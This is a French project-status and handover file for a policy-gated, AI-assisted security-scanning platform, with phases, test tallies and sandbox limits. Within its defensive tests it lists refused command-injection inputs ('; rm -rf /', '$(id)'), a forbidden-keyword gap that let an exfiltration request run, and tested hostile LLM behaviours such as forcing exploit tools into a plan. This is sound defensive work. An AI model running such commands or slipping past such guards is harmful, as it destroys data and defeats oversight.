# ÉTAT DU PROJET — plateforme IA cybersécurité

_Dernière mise à jour : 2026-08-30 (confiance de cible armée sur le chemin utilisateur)_

## Porte actuelle

| Phase | Nom | Statut | Livrable |
|---|---|---|---|
| 0 | Discovery | **TERMINÉE** | Inventaire de 324 projets uniques |
| 1 | Analyse de l'existant | **TERMINÉE** — critère de sortie 8/8 ✅ | `PHASE1/` complet |
| 2 | Architecture | **TERMINÉE** — validée avec 3 corrections | `PHASE2/ARCHITECTURE.md` |
| 3 | Minimal core | **CONSTRUIT ET DURCI** | `PHASE3/RESULTATS_SECURITE_CORRELATION.md` |
| 3.1 | **FERMÉE** | 16/16 · 10/10 · 12/12 · 22/22 · 7/7 · 10/10 | `PHASE3/CONTRAT_PUBLIC.md` |
| 4 | **FERMÉE** | 21/21 test golden | `PHASE4/STATUT_PHASE4.md` |
| 5A | **CONSTRUIT** | 27/27 provider manifest (niveau 1) | `PHASE5/STATUT_PHASE5A.md` |
| 5B | **CONSTRUIT** | 25/25 bundle · 21/21 niveau 2 | `PHASE5/STATUT_PHASE5B.md` |
| 6 | **CONSTRUIT** | 32/32 contrat LLM | `PHASE6/STATUT_PHASE6.md` |
| 7 | **CORRÉLATION PROUVÉE** | cluster inter-outils sur dépôt réel | `PHASE7/CORRELATION.md` |
| 8 | **RAPPORT HUMAIN** | deux rapports, deux publics | `PHASE3/EXEMPLE_RAPPORT_HUMAIN.md` |
| 9 | **ISOLATEUR OCI ÉCRIT** | 11/11 sans Docker, **non éprouvé** | `PHASE3/test_oci.sh` |
| 3 à 13 | — | à venir | — |

Le critère de sortie n'est pas une opinion : `python3 PHASE1/verif_sortie.py` le vérifie
mécaniquement et renvoie 0. **État actuel : 8/8, exit 0.**

## La phrase d'architecture (Phase 2)

```
LLM → Plan typé → OPA → Executor déterministe → Sandbox → Tools
```

Le plan déclaratif est la frontière de sécurité : l'IA ne produit jamais une commande, elle
produit un objet typé que le policy engine autorise ou refuse. `AI → SHELL` devient impossible
par construction.

## Le vertical slice fonctionne

`python3 PHASE3/test_slice.py` → **10/10 critères, exit 0**.

```
« Analyse la sécurité de mon dépôt »
  → 3 capacités → 3 providers → plan typé → OPA allow
  → sandbox bwrap → 65 findings → 8 clusters → rapport
```

**D2 appliquée** : la couverture déclare `package.json [not_scanned]` et les limites de chaque
outil. **D6 appliquée** : chaque finding porte `source.rule_id`, `canonical_rule_id` et
`fingerprint`. **Aucune valeur de secret stockée**, vérifié par garde-fou automatisé.

**Huit clusters et non trois** : les 62 vulnérabilités Trivy portent sur six paquets distincts.
Les fusionner aurait été malhonnête — conformément à la consigne « ne jamais forcer 64 résultats
en 3 problèmes parce que la démo attend 3 ».

**Un défaut d'architecture trouvé et corrigé** : `Registry.descr()` listait les noms de
providers, donc le LLM voyait « providers : semgrep ». Violation directe de « le planner ne
connaît pas Trivy ». Le critère 4 le vérifie maintenant mécaniquement.

**Limites assumées** : une seule forme d'exécution (`cli`) — le registre **refuse** `api`,
`async_job`, `stream` et `recursive` à la construction ; intent engine déterministe (pas de LLM) ;
limites CPU/mémoire/PIDs non imposées ; corrélation multi-outils non démontrée.

## Sécurité, traçabilité et corrélation (2026-08-27)

| Suite | Résultat |
|---|---|
| Sécurité — porte bloquante | **16/16, exit 0** |
| Slice — dix critères | **10/10, exit 0** |
| Corrélation | 7 OK, 0 échec, **1 non satisfait** |

**Corrélation inter-outils démontrée sur fixture contrôlée** : `CL-001 · cross_tool,
same_package · tools:semgrep+trivy · paquet:pyyaml`, 4 findings sources conservés.

**Deux découvertes qui contredisent ce que j'avais écrit :**

1. **`RLIMIT_AS` est inutilisable.** Ajouté pour combler le trou mémoire, il casse les outils
   réels : Trivy (`cannot allocate memory`, mmap boltdb) et Gitleaks (crash wazero). J'avais
   validé le mécanisme avec `ulimit -v`, pas son effet sur de vrais outils.
   **La mémoire n'est donc PAS limitée** — il faut cgroups ou un runtime OCI.
   `RLIMIT_NPROC`, `RLIMIT_CPU` et `RLIMIT_FSIZE` fonctionnent et sont conservés.
2. **`--die-with-parent` ne suffit pas.** `sleep 60 &` survivait au timeout avec un PID vivant.
   Corrigé par `start_new_session=True` + `killpg` sur le groupe entier.

**`plan_id` / `run_id` séparés**, avec contexte capturé (5 outils, digest des règles, digest de
la base Trivy, empreinte de policy). Critère 10 réécrit selon la formulation validée.

**Ce qui bloque une conclusion : le test B.** Aucun dépôt réel vulnérable n'existe ici. Le seul
test à l'aveugle disponible produit 0 finding et le déclare correctement — vrai négatif, mais
il ne valide pas la corrélation. **Le mécanisme est démontré, sa généralité ne l'est pas.**

## Les trois corrections du 2026-08-27

**1. Statut mémoire reformulé.** Plus « containment validée », mais :

```
validée pour les chemins, fichiers, processus et temps ;
limitation mémoire NON démontrée.
```

Suffisant pour une fixture locale et des scanners passifs. **Insuffisant** pour dépôts non
fiables, outils actifs, multi-utilisateur, services exposés, scans parallèles.

**2. Cinq identifiants, et non trois.**

```
plan_id · input_digest · execution_context_digest · run_id · result_digest
```

Critère testé : *même plan + même cible + même contexte → même result_digest* ; *autre cible →
input_digest différent, pas un rejeu comparable*. `.git` exclu du digest, commit SHA capturé à
part. `result_digest` calculé sur des tuples **triés** — permuter l'ordre des findings ne change
pas l'empreinte.

**3. Mapping de paquet versionné.** `slice/mapping_regles.yaml` remplace la table heuristique.
`original_rule_id` toujours conservé, `canonical_rule_id` défini par le mapping ou les
métadonnées, `package_mapping` déclare méthode et confiance. **3 findings à `package: null`** :
on ne devine pas.

Suites : `test_securite` 16/16 · `test_slice` 10/10 · `test_tracabilite` 12/12 ·
`test_correlation` 7 OK + 1 non satisfait.

## Phase 3.1 — version figée (2026-08-27)

**Correction de formulation :** « un seul utilisateur » est RETIRÉ des cas suffisants. Il ne
protège pas contre un dépassement mémoire — un dépôt hostile ou volumineux peut tout faire
sauter même avec un outil passif.

**Trois protections ajoutées :**

1. **Garde de refus déterministe**, dans OPA et testée :
   `cible non fiable + mémoire non bornée → REFUS`,
   `outil ACTIF + sandbox non durci → REFUS`. La limite n'est plus seulement documentée,
   elle est imposée.
2. **`input_digest` précisé** : chemins, contenu, nature, **cible des symlinks**, permissions,
   fichiers non suivis. `.git` exclu. Ajout de `input_commit` et `working_tree_dirty` — le
   commit SHA ne suffit pas si le dépôt a des modifications non commitées.
3. **Trois états d'intention** : `resolved` / `needs_clarification` / `rejected`, avec la
   distinction stricte (l'un porte une question sans motif, l'autre un motif sans question),
   et aucune exécution sur un état non résolu.

Suites : 16/16 · 10/10 · 12/12 · **22/22** · 7 OK + 1 non satisfait.

**Verdict figé :** production et dépôts non fiables **NON AUTORISÉS**, par refus déterministe.

## Phase 3.1 fermée — généralisation démontrée

**Test indépendant** sur `anotherik/Config-Portal` au commit `0ae503e6…`, clone épinglé,
scan passif hors réseau, aucun exploit. Le moteur n'a reçu que « analyse la sécurité de ce
dépôt » — aucune mention de PyYAML ni de CVE. **10/10.**

```
Trivy    : CVE-2019-20477 · CVE-2020-14343 · CVE-2020-1747
Semgrep  : avoid-pyyaml-load sur app.py
CL-002   : cross_tool, same_package, tools:semgrep+trivy
```

**Profils d'exécution** ajoutés (`profils.py`) : `controlled_dev` actif, `limites_a_prouver`
déclaré mais inutilisable. **`run_id`** comporte désormais un nonce aléatoire — 200 générations,
200 identifiants uniques — tandis que `result_digest` reste déterministe.

**Contrat public** écrit : `PHASE3/CONTRAT_PUBLIC.md`.

**Workspace** : binaires, règles et base Trivy déplacés dans `~/.cache/arena_secops/`
(1,5 Go hors workspace). Le workspace est repassé de 1 527 Mo à **2,0 Mo**.

**Quatre corrections de statut appliquées :**

1. « Généralisation démontrée » → **« transfert sur cible indépendante démontré, généralité
   encore à renforcer »**. Un seul dépôt prouve la non-circularité, pas la généralité.
2. `test_correlation.py` n'affiche plus « 7 OK + 1 non satisfait » avec exit 0 : les trois
   états (succès / échec / non évalué) sont séparés, et la partie généralisation vit dans
   `test_independant.py`. Résultat : **7/7**.
3. Le mot **« hardened » est retiré** tant que les dix limites ne sont pas testées (mémoire,
   swap, CPU, PID, taille des fichiers, timeout, réseau, capabilities, no-new-privileges,
   nettoyage). Le profil cible s'appelle `limites_a_prouver` et son usage est **refusé**.
4. **`manifeste_dependances.yaml`** : versions et SHA-256. Le bootstrap refuse un binaire
   inattendu — testé, un octet ajouté à gitleaks provoque un refus avec exit 1.

**Reste avant tout élargissement :** cgroups v2 ou runtime OCI.
**Étape suivante :** Phase 4 — un workflow utilisable et proprement présenté.

## Phase 4 — workflow utilisable

Une commande : `python3 PHASE3/analyser.py <dépôt> ["requête"]`.

Bundle par `plan_id` (donc reproductible) : `rapport.md`, `manifeste.json`, `plan.json`,
`findings.json`, `clusters.json`, `run.json`, `raw_*.json`, `rapport.sarif`.

**Rapport généré sans LLM**, de façon déterministe : à date et hexadécimaux normalisés, deux
exécutions produisent le même texte. Testé.

**Règle de sémantique testée** : le rapport parle d'**observations** et de **corrélations**,
jamais de vulnérabilités confirmées. `test_rapport.py` échoue si une sur-affirmation apparaît.

Codes de sortie : `0` exécuté · `1` erreur · `2` refusé ou clarification, **sans exécution**.

**Deux bugs trouvés en écrivant le rapport** : les versions de gitleaks, trivy et opa
s'affichaient « indisponible (FileNotFoundError) » alors que les outils avaient tourné
(mauvais chemin de binaires), et une colonne « exécuté » était affirmée sans preuve —
supprimée.

Suite : 16/16 · 10/10 · 12/12 · 22/22 · 7/7 · 10/10 · **21/21**. Somme des codes : 0.

## Phase 5A — provider manifest déclaratif

**Le test décisif de l'architecture est passé : 27/27.**

Bandit ajouté dans `capabilities.yaml`, **aucun fichier du cœur ne le connaît** (vérifié
mécaniquement). 65 findings avant, 70 après.

**Le trusted core refuse 8 tentatives** : chaîne shell, binaire non autorisé, placeholder
inconnu, `; rm -rf /`, `$(id)`, format non supporté, json sans extraction, risque inconnu.

**Canonicalisation corrigée** : `request_id` (requête brute) séparé de `plan_id` (plan
canonique). Trois formulations d'une même intention → **un seul plan_id**, trois request_id.

**Index corrigé** : `artifacts/<input_digest>/<plan_id>/<run_id>/`.

**Un problème de sécurité trouvé** : Bandit renvoie la valeur réelle du credential dans son
message. Le garde-fou a bloqué l'exécution — corrigé par masquage à l'extraction.

**Deux tests fragiles corrigés** : ils cassaient quand on ajoutait un provider, ce qui
contredisait la promesse de la phase. Attentes rendues extensibles.

Suite : 16/16 · 10/10 · 12/12 · 22/22 · 7/7 · 10/10 · **27/27** · 21/21. Somme : 0.

## Phase 5B — politique de conservation + niveau 2

**La fuite est fermée.** `raw_bandit.json` partait dans le bundle avec le credential en clair
(4 occurrences) alors que les findings étaient masqués. `test_bundle.py` cherche maintenant le
secret dans **chaque fichier** du bundle : 25/25.

**Politique** : conserver la donnée brute si elle est sûre, sinon empreinte + métadonnées +
version masquée. Déclarée dans `manifeste.json` par sortie.

**Deux niveaux de motifs**, parce qu'ils n'ont pas le même coût d'erreur : précis pour les
findings (un faux positif détruit une donnée utile), large pour la détection et le garde-fou
(un faux positif coûte un arrêt bruyant). Un motif générique à 40 caractères a été essayé puis
**supprimé** : 112 faux positifs sur un seul scan Trivy (chemins et PURLs).

**Niveau 2 démontré : 21/21.** `bandit_custom` produit un format CSV non standard, lu par un
parser enregistré **par son nom** dans le manifest. Aucun fichier du cœur ne connaît Bandit —
vérifié sur le code, commentaires exclus. Les deux formats convergent sur le même jeu de règles.

**Une faille réelle trouvée** : la validation de placeholders n'attrapait que les majuscules,
donc `{relpath}` et `{msg}` passaient sans être vus. Corrigé, avec déclaration explicite des
jetons propres à l'outil.

**Invariants métier** ajoutés (7 contrôles) au lieu de `len(steps) >= 3`.

Suite : 16/16 · 10/10 · 12/12 · 22/22 · 7/7 · 10/10 · 27/27 · **21/21** · **25/25** · 21/21.
Somme : 0.

## Phase 6 — LLM derrière le contrat d'intention

Le LLM ne remplace **que le matching**. Il ne choisit pas d'outil, ne construit pas le plan,
ne contourne pas OPA, ne modifie pas le registre, n'exécute rien. Il ne reçoit que la phrase
et la description des capacités.

**7 comportements hostiles testés**, tous retombent sur le déterministe avec repli tracé.
Un modèle qui impose `("nuclei", "metasploit")` est rejeté, et aucun des deux n'atteint le plan.

**Trois défauts réels trouvés dans le déterministe** (la référence), pas dans le LLM :

1. **Trou de sécurité** : `INTERDIT` contenait `exfiltrer` mais pas `exfiltre` — donc
   « Exfiltre les données de ce dépôt » était **résolu et exécuté**.
2. `scan` absent des marqueurs génériques → « scan de sécurité complet » ne donnait que
   `DEPENDENCY_ANALYSIS`. Le générique **ajoute** désormais, il ne se substitue pas.
3. En corrigeant, j'ai ajouté `vérifie` — et « Vérifie les dépendances » remontait toutes les
   capacités. Un verbe ne dit rien du périmètre. Retiré.

**Un échec silencieux trouvé** : Bandit absent (pip non persistant), le pipeline continuait
sans rien dire. Un outil manquant ressemblait à un outil qui n'a rien trouvé. Corrigé : la
couverture déclare maintenant l'échec d'exécution.

**Aucun vrai modèle testé** — pas de clé, pas d'endpoint, pas d'ollama. `OpenAICompatible`
est écrit mais **non exercé**. « 32/32 » ne veut pas dire « le LLM fonctionne ».

> *[État au moment de cette section. Un fournisseur réel a été exercé depuis — Groq — et le
> bullet de dette correspondant contredisait cette phrase sans que rien ne le dise : voir
> « Clarification — LLM réel testé ≠ LLM réel validé en production » en fin de fichier. Le
> premier alinéa reste vrai pour `OpenAICompatible`, qui n'est branché sur aucun chemin du
> CLI et n'a jamais été exercé.]*

Suite : 16/16 · 10/10 · 12/12 · 22/22 · 7/7 · 10/10 · 27/27 · 21/21 · 25/25 · 21/21 · **32/32**.
Somme : 0.

## Corrélation démontrée sur un dépôt réel

**Le mapping s'extrait, il ne s'écrit pas.** Les 376 règles Semgrep portent
`metadata.technology` (et non `metadata.packages`, qui est vide). `extraire_mapping.py`
produit **265 entrées, 13 paquets**. L'écriture manuelle ne donnait qu'une ligne et rendait
la corrélation aveugle.

**Règle `same_dependency_usage`** : CVE sur paquet X + usage dangereux de CE paquet → un seul
cluster explicitement lié. Une règle non mappée ne produit aucun lien.

**Résultat sur `cve-search`** (198 fichiers, projet réel) :

```
CL-001 · 6 membres · high · dependance:flask
  same_dependency_usage, related_dependency, same_package, cross_tool, tools:semgrep+trivy
  5 findings Semgrep Flask + CVE-2026-27205 (Trivy)
```

`nltk` a 5 CVE et **aucun** cluster inter-outils — correct, aucun finding Semgrep n'y est lié.

**Non prouvé** : une seule règle de corrélation démontrée, un seul dépôt réel, mapping limité
à 13 paquets Python.

Suite : **11/11 vertes**, somme 0.

## Isolateur OCI — écrit, mais NON ÉPROUVÉ

`isolateur_oci.py` produit la commande de confinement avec les dix limites :
mémoire, swap, CPU, PID, taille des fichiers, timeout, réseau, capabilities,
no-new-privileges, lecture seule + nettoyage.

`test_isolateur.py` (**11/11**) vérifie sans Docker que la commande est correcte et
**identique à celle du harnais** — sinon le harnais testerait autre chose que la production.

**Ce qui n'est pas prouvé : que les limites tiennent réellement.** Aucun runtime OCI dans
l'environnement de développement. `test_oci.sh` est écrit et refuse de tourner sans Docker
(code de sortie 2) — c'est voulu.

**À faire sur une machine avec Docker :** `./PHASE3/test_oci.sh`. Tant qu'il n'a pas tourné,
le profil « non fiable » reste fermé.

## Ce qui a été décidé

| Décision | Valeur | Où |
|---|---|---|
| **Licence de la plateforme** | **Apache-2.0**, provisoire | `CRITERES.md` §2.3 |
| Critères de notation | archi 50 % / code 30 % / couverture 20 % | `CRITERES.md` §1 |
| Gates bloquantes | G1 inactif, G2 licence, G5 archivé | `CRITERES.md` §2 |
| G3 / G4 | signaux de risque manuels, **jamais de valeur inventée** | `CRITERES.md` §2.2 |
| Shortlist | 35–40 repos (écart assumé vs « 10–20 » du master prompt) | `MASTER_PROMPT.md` |
| Triage | 38 approfondis / 65 obligatoires / 187 minimaux / 29 N/A | `CRITERES.md` §7 |

**Portée de la licence** : elle ne rend pas réutilisable un composant GPL, LGPL, MPL ou AGPL.
Chaque dépendance garde sa propre licence. Réversible tant qu'aucun commit public n'est publié.

### Les cinq décisions de Phase 2, actées

| Décision | Verdict |
|---|---|
| Findings | Modèle **interne** = source de vérité, SARIF en import/export seulement |
| Policy engine | **OPA en sidecar HTTP/WASM** — OPA décide, Python applique |
| Sandbox | Conteneur restreint (8 conditions) pour outils passifs, renforcé en Phase 7 |
| Orchestration | **Ni LangGraph ni Temporal** dans le minimal core, interfaces préparées |
| ContextForge | Référence uniquement, hors périmètre opérationnel |

### Trois corrections aux données de Phase 1

`open-policy-agent/opa` n'est pas un SDK Python mais un **sidecar HTTP** (OPA est écrit en Go).
`DefectDojo` n'est pas un import mais une **référence architecturale**. `agent-governance-toolkit`
passe en **à confirmer**, son code n'ayant pas été lu.

**Effet mesuré :** INTEGRATE 13 → **12**, imports de code 4 → **2**, et **le minimal core
n'importe aucun code externe** — donc aucune licence ne le contraint.

## Résultats mesurés

| | |
|---|---|
| Fiches brutes dans le fichier source | 444 |
| Entrées uniques après déduplication | **324** |
| Repos GitHub exploitables | 295 |
| Shortlist retenue | **38** |
| Verdicts | 13 INTEGRATE · 18 ADAPT (archi) · 7 ADAPT · 5 IGNORE |
| Les 13 INTEGRATE | 6 outils externes · 4 imports de code · 3 composants d'infrastructure |
| Licence inconnue | 59 |
| Archivés / inactifs > 18 mois | 14 / 34 |

## Les trois seules raisons d'être du projet

La matrice de couverture (`PHASE1/06_MATRICE_COUVERTURE.md`) montre que **8 capacités sur 14
sont déjà couvertes par des outils qu'il suffit de piloter**. Il ne reste que trois éléments
qui n'existent nulle part :

1. **Intent engine** — intention en langage naturel → capacités
2. **Capability registry** unifié — modèles prometteurs, intégration non résolue
3. **Corrélation multi-outils** — lacune majeure, **0 candidat** sur 324 entrées (mesuré)

Tout le reste existe déjà.

## Fichiers utiles

| Fichier | Rôle |
|---|---|
| `MASTER_PROMPT.md` | fil conducteur du projet |
| `PROJET_ETAT.md` | ce fichier |
| `PHASE1/01_RAPPORT.md` | rapport d'analyse et shortlist |
| `PHASE1/03_ARCHI_REFERENCE.md` | **les 5 questions d'architecture + BUILD/INTEGRATE/ADAPT par brique** |
| `PHASE1/06_MATRICE_COUVERTURE.md` | couverture par capacité et par couche, avec confiance et preuve |
| `PHASE1/CRITERES.md` | barème, gates, vocabulaire, triage, critère de sortie |
| `PHASE1/02_TRIAGE.csv` | les 324 entrées avec statut et motif |
| `PHASE1/99_BACKLOG.md` | 281 entrées écartées + les 5 décisions de Phase 2 |
| `PHASE1/05_PROVENANCE.md` | d'où vient chaque chiffre, erreurs corrigées, limites |
| `PHASE1/verif_sortie.py` | vérifie le critère de sortie |

## Ce que la lecture du code des trois outils a changé

Détail dans `PHASE3/VERIF_OUTILS.md`. Quatre conséquences sur l'architecture :

1. **Trivy et Semgrep produisent du SARIF nativement** — l'export est gratuit, pas de
   convertisseur à écrire.
2. **Aucune des trois images officielles n'est utilisable telle quelle** : Trivy et Gitleaks
   tournent en root, Gitleaks renvoie **le secret en clair** (`--redact` non actif par défaut),
   Trivy envoie de la **télémétrie à Aqua par défaut**.
3. **`--offline-scan` de Trivy ne fait pas ce que son nom dit** : il coupe les requêtes API
   d'identification de dépendances, pas la mise à jour de base. Il faut `--download-db-only`
   hors sandbox puis `--skip-db-update`.
4. **Gitleaks ne fournit aucune sévérité.** La sévérité est notre responsabilité.

D'où l'ajout du champ `args_obligatoires` au schéma de provider.

**Décision actée le 2026-08-27 : la valeur d'un secret découvert n'entre jamais dans notre base.**
On ne conserve que les métadonnées (type, fichier, ligne, outil, fingerprint, sévérité).
Si la valeur exacte est un jour nécessaire, on relance l'outil. C'est une exception explicite au
principe « ne jamais détruire la donnée originale » — voir `PHASE2/ARCHITECTURE.md` §4.1.

**Non vérifié faute de Docker dans cet environnement** : Semgrep sans réseau (risque élevé,
seul point capable de changer le périmètre), les trois outils en `--read-only` + `--cap-drop=ALL`,
et la latence d'OPA en sidecar.

## Tests réels des trois outils (2026-08-27)

Semgrep 1.175.0, Trivy 0.74.0 et Gitleaks 8.30.1 ont été **installés et exécutés** sur un dépôt
de test. Détail dans `PHASE3/RESULTATS_TESTS.md`.

**Validé par exécution :**
- Gitleaks renvoie bien le secret **en clair** ; `--redact` le remplace par `REDACTED`
- Gitleaks n'a **aucun** champ de sévérité (18 champs vérifiés)
- Trivy et Semgrep produisent du **SARIF 2.1.0 valide**
- Trivy fonctionne hors ligne **si le cache est pré-peuplé** (1,3 Go) ; sinon échec explicite
- Semgrep fonctionne hors ligne **avec des règles locales** ; avec `p/ci` il échoue (exit 2)

**Trois découvertes non prévues :**
1. `p/ci` charge 160 règles et ne trouve **rien** sur notre fixture, alors que `p/python`
   trouve les deux vulnérabilités. Un mauvais jeu de règles produit un scan vide sans erreur.
2. Trivy **ignore silencieusement `package.json`** : sans lockfile, 1 fichier analysé ;
   avec `package-lock.json`, 2 fichiers et 12 vulnérabilités de plus.
3. L'identifiant de règle Semgrep **change selon l'origine** (préfixe `rules.` en local),
   ce qui casserait la déduplication sans normalisation.

**Blocage sandbox LEVÉ** — sans Docker. bubblewrap 0.12.0, namespaces autorisés
(`max_user_namespaces=7917`), `CapEff` déjà nul. `PHASE3/test_bwrap.sh` : **11 tests sur 11,
exit 0**. Les trois outils tournent en uid 1000, racine en lecture seule, sans capabilities,
sans réseau, et produisent leurs résultats normalement (62 vulnérabilités Trivy, 2 Semgrep,
1 leak Gitleaks masqué).

**Seul reste non validé :** les limites CPU / mémoire / PIDs, qui demandent cgroups ou un vrai
conteneur. Sans impact sur l'architecture.

**Six décisions proposées, AUCUNE appliquée** — voir `PHASE3/DECISIONS_PROPOSEES.md` :
D1 `config_epinglee` · D2 couverture/incomplétude · D3 sandbox imposé par nous ·
D4 réseau selon le risque · D5 préparateur dédié · D6 `id_canonique`.

La plus urgente est **D2** : elle touche au modèle de données, tout le reste en dépend.

**Validation de généralisation sur les 38** — `PHASE3/VALIDATION_GENERALISATION.md`.
Résultat principal : **les 38 ne sont pas 38 providers.** Répartition réelle : 10 providers,
10 composants de la plateforme, 1 lib, 10 moteurs pairs (concurrents), 7 références de modèle.

Trois trous identifiés, cinq corrections proposées (G1 à G5, aucune appliquée) :
- aucun concept pour les **composants** de la plateforme → il manque un `COMPONENT REGISTRY`
- **une seule forme d'exécution sur quatre** est implémentée et testée (le CLI)
- le registre ne sait pas représenter **l'enrichissement** ni la **remédiation** (notre Phase 11)

La promesse « ajouter un provider = ajouter une déclaration » est **fausse dans l'absolu** :
elle ne vaut que pour une forme d'exécution déjà supportée. Correction proposée : définir un
ensemble clos de formes (`cli`, `api`, `async_job`, `stream`, `recursive`).

## Limites assumées — à traiter en P1

**Toutes les notes sont en `confiance = moyenne`.** Elles reposent sur README + arborescence.
Aucun code n'a été lu, aucun test compté. Avant de décider un INTEGRATE en `code réutilisable`
(OPA, DefectDojo, FastMCP, agent-governance-toolkit), il faut lire le code réel.

**Les étiquettes de section du fichier source sont parfois fausses** : `langchain`, `grafana`,
`keycloak`, `vault`, `moby` classés « Vulnerability Management ». Non corrigé.

## Journal

- 2026-08-27 — Master prompt matérialisé. Workspace vide au départ.
- 2026-08-27 — Inventaire reçu : 444 fiches, pas 125. 324 entrées uniques après déduplication,
  14 URL corrigées, 618 requêtes github.com.
- 2026-08-27 — Barème révisé sur to-do list externe : G5 officialisée, G3/G4 déclassées en
  signaux manuels, G2 restreinte à la réutilisation de code, champs `usage`/`mode_integration`.
- 2026-08-27 — Licence actée : Apache-2.0 provisoire. Triage des 324 entrées. Matrice de
  couverture. Critère de sortie binaire vérifié 8/8. **Phase 1 fermée.**
- 2026-08-27 — Phase 2 : architecture validée avec trois corrections (providers en graphe
  contrôlé et non récursif, OPA en sidecar HTTP, ni LangGraph ni Temporal dans le minimal core).
  Trois fiches de Phase 1 corrigées. **Phase 3 ouverte.**
- 2026-08-27 — Lecture du code de Semgrep, Trivy et Gitleaks. SARIF natif confirmé chez deux
  d'entre eux. Trois problèmes de sécurité par défaut découverts (root, secrets en clair,
  télémétrie). Champ `args_obligatoires` ajouté au schéma de provider.
- 2026-08-28 — Session sur bundle recréé (33 fichiers). Bootstrap corrigé : OPA épinglé
  1.20.0 conforme au manifeste, affichages de version sans tube, exit 0. **Porte réparée** :
  javascript.yaml téléchargé + épinglé (Semgrep ressort en 0 au lieu de 7, règles JS
  déclenchées — mesuré). Fixture `PHASE3/testrepo_iac` créée, ATTENDUS extrait d'exécution
  (15 checks terraform). **checkov 3.3.15 intégré niveau 1 (IAC_SCAN)** : hors ligne prouvé
  (bwrap --unshare-net, 38/38 findings identiques), aucune fuite du faux secret, severity
  null en OSS → « indéterminée ». Liste blanche `BINAIRES_AUTORISES` étendue (seule ligne
  de cœur touchée). Catalogue : nuclei/nikto corrigés api→cli. Décision providers toujours
  en attente de validation (`PHASE5/DECISION_PROVIDERS_PROPOSEE.md`) ; batteries de tests
  à relancer côté source (`PATCHES_A_PORTER.md`).
- 2026-08-28 — **REPRISE COMPLÈTE du projet dans ce workspace** (la session source s'arrête,
  contexte épuisé). Transfert de 63 fichiers en 5 parties : empreintes SHA-256 vérifiées
  63/63 à l'extraction. `cible_independante` reclonée au commit épinglé `0ae503e6…`.
  **TOUTES LES PORTES VERTES** : securite 16/16 · slice 10/10 · manifest 27/27 ·
  niveau2 21/21 · bundle 24/24 · intentions 22 · tracabilite 12 · rapport 20/20 ·
  isolateur OK · llm 32/32 · **correlation 7/7** · **independant 10/10** ·
  **verif_sortie 8/8** · **bwrap 11/11** · oci : refus 2 voulu (pas de Docker).
  Trois corrections réelles ce jour : (1) test_niveau2 7f — liste d'outils autorisés
  étendue à checkov (attente extensible) ; (2) `PHASE1/NOTES.csv` régénéré par
  `gen_notes.py` (absent du transfert) ; (3) **test_bwrap.sh pointait sur les chemins
  d'avant la migration Phase 3.1** (`PHASE3/rules`, `PHASE3/gitleaks`…) — bwrap échouait
  au montage et les 3 « OK » restants étaient des FAUX POSITIFS. Aligné sur
  `~/.cache/arena_secops` (même variable que sandbox.py) : 11/11 honest. L'hypothèse
  « bwrap 0.11 vs 0.12 » des deux sessions était fausse. La couche d'exécution est
  prouvée dans cet environnement.

---

# REPRISE DE SESSION — à lire en premier

_Ce document est le point d'entrée d'une nouvelle session. Tout est dans les fichiers,
rien n'est dans la conversation._

## En une phrase

Plateforme open source qui transforme une intention de sécurité en langage naturel en
exécution contrôlée d'outils, puis regroupe les résultats en problèmes compréhensibles.

## Où on est

```
Phase 0-3.1   FAITES    moteur fonctionnel, testé, rapport validé par un humain
Phase 4       FAITE     deux rapports (humain + ingénieur)
Phase 5A      EN COURS  catalogue et matrice de couverture faits, AUCUN provider ajouté
```

## Ce qui marche aujourd'hui

```bash
bash PHASE3/bootstrap.sh                                          # reconstruit l'environnement
python3 PHASE3/analyser.py <dépôt> "Analyse la sécurité de ce dépôt"
python3 PHASE3/test_securite.py                                   # porte bloquante
```

12 batteries de tests, toutes vertes. 3 outils intégrés : semgrep, trivy, gitleaks.
5 capacités couvertes sur 17.

## Ce qu'il faut lire, dans l'ordre

| Fichier | Pourquoi |
|---|---|
| `MASTER_PROMPT.md` | le projet, et la section 12 « ce qu'on a appris en route » |
| `PROJET_ETAT.md` | ce fichier : où on en est |
| `PHASE1/09_MATRICE_COUVERTURE_PROVIDERS.csv` | les 12 capacités manquantes |
| `PHASE1/08_FICHES_PROVIDERS.csv` | 69 fiches, apport réel de chaque outil |
| `PHASE3/CONTRAT_PUBLIC.md` | le contrat : ce que le système garantit |
| `PHASE1/CRITERES.md` | le barème, les gates, le vocabulaire |

## La décision en attente

**Quels providers intégrer ensuite.** La recommandation actuelle :

```
Groupe A — passif, intégrable maintenant
  checkov    IAC_SCAN            8 973 étoiles
  sigma      DETECTION_RULES    10 948 étoiles
  grype      SBOM               12 791 étoiles

Groupe B — actif, à attendre la couche d'autorisation
  nmap       NETWORK_DISCOVERY
  ffuf       WEB_ENDPOINT_DISCOVERY
  zap        WEB_VULN_SCAN
```

**Rien n'est validé.** C'est une recommandation, pas une décision.

## Les règles à ne pas oublier

1. **Les phases sont des portes.** Tant qu'une phase n'est pas validée, on ne construit pas
   la suivante.
2. **Le registre ne contient pas deux capacités pour un même besoin.** Sinon tout moteur
   qui sélectionne par capacité sur-sélectionne.
3. **Un outil qui ne tourne pas doit être déclaré**, jamais silencieux. C'est le pire mode
   d'échec d'un outil de sécurité.
4. **Un finding isolé n'est pas un finding inexistant.** Un bug du rapport cachait un
   secret de gravité haute. Corrigé, mais c'est la classe de bug à surveiller.
5. **Le mapping des règles s'extrait, il ne s'écrit pas.** Une table manuelle d'une ligne
   rendait la corrélation aveugle.
6. **Ne pas durcir ce que personne n'utilise.** On a perdu du temps à durcir l'isolation
   avant que quiconque ait utilisé le produit.

## Ce qui est connu mais non résolu

- **Le modèle de findings ne porte pas le `cadre` (framework) en natif.** Checkov
  multi-framework produit 38 observations (terraform/kubernetes/dockerfile), mais le
  finding final ne sait pas dire « je viens de Kubernetes » : le champ `cadre` reste
  dans le JSON brut, et il faut le déduire du fichier. Dette technique actée le
  2026-08-28 : à traiter quand un vrai besoin l'exigera (tri ou filtrage par
  framework dans le rapport), PAS avant — le modèle de findings est figé et le
  faire évoluer maintenant serait repartir en boucle de refonte.

- **Pas d'isolation mémoire.** `RLIMIT_AS` casse trivy et gitleaks. Il faut cgroups ou un
  runtime OCI. Le profil « dépôt non fiable » reste fermé.
- **`PHASE3/test_oci.sh` n'a jamais été exécuté.** Il faut une machine avec Docker.
- **Le contrat d'intention a été exercé contre un vrai modèle** (Groq, API compatible
  OpenAI) : `PHASE3/test_llm_reel.py` compare le déterministe et le modèle sur les mêmes
  phrases et vérifie 11 points du contrat. C'est une preuve **d'intégration, pas de
  robustesse** : ni la date du passage ni le nombre de cas verts à ce moment-là ne sont
  rétablis ici (historique transféré en 3 commits), et le fournisseur limite les appels
